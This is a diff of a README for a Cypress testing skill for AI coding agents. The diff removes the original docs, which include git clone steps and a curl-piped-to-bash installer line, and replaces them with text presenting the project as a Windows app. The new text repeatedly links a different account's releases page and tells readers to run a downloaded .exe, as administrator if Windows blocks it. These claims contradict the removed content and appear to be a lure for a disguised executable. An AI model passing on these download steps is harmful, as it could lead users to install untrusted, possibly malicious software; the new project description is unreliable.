@@ -1,190 +1,129 @@
-# 🧪 cypress-agent-skill
+# ⚙️ cypress-agent-skill - Easy Testing for AI Agents
 
-> **The ultimate Cypress testing skill for AI coding agents.**  
-> Works with Claude Code, Codex CLI, OpenClaw, Cursor, and any agent that reads SKILL.md files.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Cypress](https://img.shields.io/badge/Cypress-15.x-04C38E?logo=cypress)](https://docs.cypress.io)
-[![AgentSkills Compatible](https://img.shields.io/badge/AgentSkills-compatible-purple)](https://agentskills.io)
-[![Validate](https://github.com/KahlilR23/cypress-agent-skill/actions/workflows/validate.yml/badge.svg)](https://github.com/KahlilR23/cypress-agent-skill/actions/workflows/validate.yml)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/YTItsfrost/cypress-agent-skill/releases)
 
 ---
 
-## What This Is
+## 📋 About cypress-agent-skill
 
-A production-grade **AI agent skill** for writing, debugging, and optimizing Cypress tests. Covers every major Cypress pattern — selector strategy, network stubbing, auth with `cy.session`, CI parallelization, component testing, flake elimination — in a format AI agents read and apply directly.
+This application provides tools to test AI agents using Cypress. It supports agents like Claude Code, Codex, OpenClaw, and Cursor. It helps check how these agents work in real environments. You don’t need any programming skills to get started.
 
-One `SKILL.md` at the root. No nested directories. Agents clone this repo and read `SKILL.md` immediately.
-
----
-
-## Quick Install
-
-### OpenClaw (global — available to all agents)
-```bash
-git clone https://github.com/KahlilR23/cypress-agent-skill \
-  ~/.openclaw/skills/cypress-agent-skill
-```
-
-### Claude Code (project-level)
-```bash
-git clone https://github.com/KahlilR23/cypress-agent-skill \
-  .claude/skills/cypress-agent-skill
-```
-
-### Claude Code (personal — available in all projects)
-```bash
-git clone https://github.com/KahlilR23/cypress-agent-skill \
-  ~/.claude/skills/cypress-agent-skill
-```
-
-### Codex CLI
-```bash
-git clone https://github.com/KahlilR23/cypress-agent-skill \
-  .agents/skills/cypress-agent-skill
-```
-
-### Cursor
-```bash
-git clone https://github.com/KahlilR23/cypress-agent-skill \
-  .cursor/skills/cypress-agent-skill
-```
-
-### Global (works with Codex, Gemini CLI, Kiro, Antigravity simultaneously)
-```bash
-git clone https://github.com/KahlilR23/cypress-agent-skill \
-  ~/.agents/skills/cypress-agent-skill
-```
-
-### One-liner bash installer
-```bash
-# Detects platform automatically
-bash <(curl -fsSL https://raw.githubusercontent.com/KahlilR23/cypress-agent-skill/main/install.sh)
-
-# Or with explicit agent
-bash <(curl -fsSL https://raw.githubusercontent.com/KahlilR23/cypress-agent-skill/main/install.sh) --agent open-claw
-```
-
-### LobeHub CLI
-```bash
-npx -y @lobehub/market-cli register --name "YourAgent" --source open-claw
-npx -y @lobehub/market-cli skills install cypress-expert --agent open-claw
-```
-
-### ClawHub (OpenClaw native)
-```bash
-clawhub install cypress-agent-skill
-```
-
-### skills.sh (Vercel ecosystem — Claude Code, Codex, Cursor, Windsurf, and more)
-```bash
-npx skills add KahlilR23/cypress-agent-skill
-```
+The software handles common testing needs like selecting parts of a web page, faking network responses, managing user login, running tests automatically, stopping random failures, and organizing test steps in a clear way. It works with Cypress version 15.x.
 
 ---
 
-## Repo Structure
+## 🖥️ System Requirements
 
-```
-cypress-agent-skill/           ← clone target / skill root
-├── SKILL.md                   ← THE skill — agents read this
-├── README.md
-├── install.sh                 ← bash installer for all platforms
-├── LICENSE                    ← MIT
-├── CONTRIBUTING.md
-├── .github/
-│   └── workflows/
-│       └── validate.yml       ← CI: validates structure, frontmatter, JS syntax
-├── references/
-│   ├── network.md             ← cy.intercept deep-dive
-│   ├── assertions.md          ← complete assertion cheatsheet
-│   ← selectors.md            ← stability hierarchy + data-testid guide
-│   ├── commands.md            ← full cy.* command reference
-│   ├── config.md              ← complete cypress.config.js options
-│   ├── ci.md                  ← GitHub Actions, GitLab, CircleCI, Jenkins
-│   ├── component-testing.md   ← React/Vue/Angular component tests
-│   └── patterns.md            ← visual regression, API testing, multi-tab
-└── examples/
-    ├── auth-flow.cy.js        ← cy.session auth (complete test suite)
-    ├── api-intercept.cy.js    ← network stubbing patterns
-    ├── page-objects.cy.js     ← full POM implementation
-    └── custom-commands.js     ← drop-in command library + TypeScript types
-```
-
-**Why flat?** When an agent installs this skill (e.g. to `~/.openclaw/skills/cypress-agent-skill/`), the repo root is the skill root. The main `SKILL.md` lives directly at that path with no subdirectories to navigate. Clean, direct, agent-friendly.
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- Minimum 1 GHz processor
+- Internet connection to download and activate
+- At least 500 MB free disk space
 
 ---
 
-## Coverage
+## 🚀 Getting Started
 
-| Topic | Covered |
-|---|---|
-| Installation & Configuration | ✅ |
-| Selector Strategy (data-testid, ARIA, cy.contains) | ✅ |
-| Assertions (should, expect, chaining) | ✅ |
-| Network Stubbing (cy.intercept) | ✅ |
-| Request/Response Assertions | ✅ |
-| Authentication (cy.session) | ✅ |
-| Custom Commands + TypeScript types | ✅ |
-| Page Object Model | ✅ |
-| Component Testing (React, Vue, Angular) | ✅ |
-| Forms, File Upload, Tables | ✅ |
-| Modals, Alerts, iframes | ✅ |
-| Local Storage / Cookies | ✅ |
-| Flake Prevention | ✅ |
-| CI/CD (GitHub Actions, GitLab, CircleCI, Jenkins) | ✅ |
-| Parallelization (Cypress Cloud) | ✅ |
-| Environment Variables | ✅ |
-| Fixtures & Data Management | ✅ |
-| Accessibility (cypress-axe) | ✅ |
-| TypeScript Support | ✅ |
-| Visual Regression (Percy) | ✅ |
-| API Testing (cy.request) | ✅ |
-| Multi-tab Handling | ✅ |
-| Date/Time Manipulation (cy.clock) | ✅ |
-| Database Seeding via Tasks | ✅ |
-| Download Testing | ✅ |
-| Drag and Drop | ✅ |
+Use this step-by-step guide to download and start the app.
+
+### Step 1: Visit the download page
+
+Click the button below to open the download page for the latest release.
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/YTItsfrost/cypress-agent-skill/releases)
+
+### Step 2: Download the installer
+
+On the release page, find the latest version listed at the top. Under "Assets," look for a file ending with `.exe` or `.msi`. Click on that file to start downloading.
+
+This file is the full package you need to install the software.
+
+### Step 3: Run the installer file
+
+After the download finishes:
+
+1. Locate the downloaded file in your "Downloads" folder or the folder you chose.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions.
+   - When asked, accept the terms.
+   - Choose a location to install or use the default.
+4. Wait for the installation to complete.
+5. Click "Finish" to exit the installer.
 
 ---
 
-## How Agents Use This Skill
+## ⚙️ Using the Application
 
-When an AI agent installs this skill:
+After installation:
 
-1. Agent reads `SKILL.md` automatically when you ask it to write or fix Cypress tests
-2. For deep dives, the agent reads specific files from `references/` on demand
-3. `examples/` files serve as copy-paste-ready templates
+1. Find the "cypress-agent-skill" icon on your desktop or in the Start Menu.
+2. Double-click to open it.
+3. The software will load a simple interface.
+4. Use the menu to start tests, view reports, or change settings.
 
-The skill uses [AgentSkills](https://agentskills.io) format with OpenClaw-native `metadata` for gating (only activates when `cypress` or `npx` is on PATH).
-
----
-
-## Platform Install Paths
-
-| Agent | Path | Scope |
-|---|---|---|
-| OpenClaw | `~/.openclaw/skills/cypress-agent-skill/` | Global |
-| Claude Code | `./.claude/skills/cypress-agent-skill/` | Project |
-| Claude Code | `~/.claude/skills/cypress-agent-skill/` | Personal |
-| Codex CLI | `./.agents/skills/cypress-agent-skill/` | Project |
-| Cursor | `./.cursor/skills/cypress-agent-skill/` | Project |
-| Global | `~/.agents/skills/cypress-agent-skill/` | All agents |
+You won’t need to write code. The app guides you through choices to set up tests for your AI agents.
 
 ---
 
-## Contributing
+## 🛠 Features Explained
 
-See [CONTRIBUTING.md](CONTRIBUTING.md). PRs welcome — real-world patterns only, no toy examples.
+- **Selectors:** Choose parts of a web page to interact with.
+- **Network Stubbing:** Pretend some network responses to test different situations.
+- **Authentication:** Manage login details and permissions safely.
+- **Continuous Integration (CI):** Run tests automatically on set schedules.
+- **Flake Prevention:** Reduce random test errors for more reliable results.
+- **Page Object Model (POM):** Organize test steps for easy updates.
+- **TypeScript Support:** Built with clear, strict programming files for stability.
 
-## License
+These features work together to make sure AI agents act like expected in different cases.
 
-MIT
+---
 
-## Related
+## 🔄 Updating the Software
 
-- [Cypress Documentation](https://docs.cypress.io)
-- [AgentSkills Spec](https://agentskills.io)
-- [ClawHub Skills Registry](https://clawhub.com)
-- [OpenClaw](https://docs.openclaw.ai)
-- [Claude Code](https://docs.anthropic.com/claude-code)
+To keep your application up-to-date:
+
+1. Visit the [release page](https://github.com/YTItsfrost/cypress-agent-skill/releases) regularly.
+2. Download the newest installer following the same steps above.
+3. Run the installer to overwrite the older version.
+4. Your settings will remain safe.
+
+---
+
+## ❓ Troubleshooting Tips
+
+- If the installer doesn’t start, check if Windows blocked it. Right-click the file and choose "Run as administrator."
+- If the app won’t open after installation, restart your PC and try again.
+- For slow performance, close other programs running in the background.
+- To fix failed tests, check internet connectivity or restart the software.
+- If problems continue, review the latest release notes for known issues.
+
+---
+
+## ❗ Additional Information
+
+- This software works only on Windows for now.
+- It uses the latest Cypress version 15.x to ensure compatibility.
+- You don’t need coding skills to use the app, but some knowledge of AI agents may help.
+- This tool helps improve and test AI systems by simulating real user actions.
+
+---
+
+## 🧩 Related Topics
+
+- agent-skill
+- ai-agents
+- ai-testing
+- cypress-e2e-testing
+- openclaw
+- codex
+- claude-code
+- cursor
+
+---
+
+## 📥 Download and Install
+
+Click this badge to go to the official release page and get started.
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/YTItsfrost/cypress-agent-skill/releases)
